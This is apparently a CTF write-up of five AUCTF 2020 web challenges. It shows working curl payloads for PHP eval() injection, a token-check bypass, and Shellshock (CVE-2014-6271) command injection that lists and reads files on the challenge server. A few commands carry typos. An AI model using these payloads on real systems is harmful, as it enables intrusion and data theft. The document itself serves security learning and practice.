# AUCTF 2020 Web Writeups

## Miyazaki Trivia
The site says "Find this special file", if we navigate to the site's _robots.txt_ we find a trivia page.
We are told to make a post request with a particular header that answers a trivia question. When we do
some Googling or if we play the game Bloodborne we can find that the adage is "Fear the Old Blood". We
are able to submit our answers with the following `curl` command:

`curl -XPOST -H "answer:fear the old blood" http://challenges.auctf.com:30020/robots.txt`


## Quick Maths
We are presented with a calculator web app and nothing else. The chrome extension _Wappalyzer_ allows
us to see that the site is built using PHP. We can test the calculator for funtionality by inputting
some mathmetic expressions like `1+1` and `2**3`. Seeing that the calculator does compute the expressions,
we can input some bad math like `2 / 0` to see how the calculator responds. The calculator leaks the
function name that was doing computations:
```
Warning: Division by zero in /var/www/html/index.php(5) : eval()'d code on line 1
INF
```
Now that we know the page is running `eval()` we can attempt some php code injection. We can try leaking
defined variables with `get_defined_vars()`. It returns Array, so we know that we have code execution. We
can expand upon this with printing defined vars with `print_r(get_defined_vars())`. This leaks our flag.

'
## gg no re
After navigating to the site, we are told that there is nothing to see there, but if we view the page's
source, we can see that the page has a javascript page that is loaded in. We can navigate to and inspect
this javascript page. We find a highly obfuscated script, but if we put the base64 decode the long string
at the very beginning, we are able to see that we may not have to do much more. We navigate to the page
that we are told to go to, and we are presented with "Howdy Neighbor". If we look into the cookies and headers
that are sent in the HTTP response we get an encoded string. We decode that string and we are told to go to
`/api/final.php` and make a POST request. Navigating to the page, we are told to set a variable called flag.

`curl -XPOST -d "flag=flag" http://challenges.auctf.com:30022/api/final.php`

## API madness
There are 2 possible solutions to this challenge. Navigating to the index page greets us with JSON telling
us that there is a help page for the API. Looking at this page, we can see that we have a few endpoints for
potentially a FTP server. From these docs we know that we have to make requests to the server using the POST
method.

### Solution 1
We see that there are some backend ftp endpoints. We can try to authenticate into the server using the login
endpoint `/api/login` with `curl -XPOST -H 'Content-type: application/json' -d '{"username":"username", "password":"password"}' http://challenges.auctf.com:30023/api/login`.
The login endpoint hangs, but if we wait on it, it will crash and print a stack trace. If we look into the stack trace,
we can see that there is an endpoint called `/api/login_check`. If we try authing again, but against this endpoint,
we try again, and we receive a token. We can use this token to access some of the backend endpoints for `/api/ftp/`.
`curl -XPOST -H 'Content-type: application/json' -d '{"token":"token_hash", "dir":"."}' http://challenges.auctf.com:30023/api/ftp/dir`
We can see a flag.txt in this directory listing, so we can use the `/api/ftp/get_file` endpoint to possibly print
the file. `curl -XPOST -H 'Content-type: application/json' -d '{"token":"token_hash", "file":"flag.txt"}' http://challenges.auctf.com:30023/api/ftp/get_file`

### Solution 2
We can test the backend endpoints for auth bypass, which allows us to skip the most stressful portion of Solution 1.
We can deduce that the api will speak in JSON from the index page being a JSON dump. JSON APIs usually authenticate
with JWT, so we will try accessing the backend without a token. `curl -XPOST -H 'Content-type: application/json' -d '{"dir":"."}' http://challenges.auctf.com:30023/api/ftp/dir`
It responds with a `403 Forbidden` error likely due to it expecting a token. If we try giving it a bogus token to determine
if it is actually checking token. `curl -XPOST -H 'Content-type: application/json' -d '{"token":"blah","dir":"."}' http://challenges.auctf.com:30023/api/ftp/dir`.
This is great, now we can see that the tokens are not checked. We also can see that there is a flag  file in this directory.
We can try retrieving it with `curl -XPOST -H 'Content-type: application/json' -d '{"token":"random","file":"flag.txt"}' http://challenges.auctf.com:30023/api/ftp/get_file`

## M1 Abrams
We are presented with a default Apache web server. Running `dirb` on this URL prints 2 directories that have `403` errors.
If we run `dirb` on these directories we can find that there is a http://challenges.auctf.com:30024/cgi-bin/scriptlet page.
Navigating to the page shows us what seems to be the output of the `id` command. We can try exploiting Shellshock, CVE-2014-6271.
`curl -A '() { :; };echo;echo;echo;/bin/sleep 3 http://challenges.auctf.com:30024/cgi-bin/scriptlet`. This is will make the
server sleep for 3 seconds before it returns. This means that we have code injection. `curl -A '() { :; };echo;echo;echo;/bin/ls /' http://challenges.auctf.com:30024/cgi-bin/scriptlet`
This prints us the `/` directory where we can see that there is a file named `flag.file`. We can cat this file and solve it. The file
is a hexdump of something, and if we look at the ascii of the hexdump, there seems to be a `flag.txt` string within it. Reversing
the hexdump gives a G-Zip compressed file, which we can decompress for the flag.
```bash
curl -A '() { :; };echo;echo;echo;/bin/cat /flag.file' http://challenges.auctf.com:30024/cgi-bin/scriptlet > test.tmp
cat test.tmp
xxd -r -p test.tmp > temp
file temp
mv temp temp.gz
guzip temp.gz
cat temp
```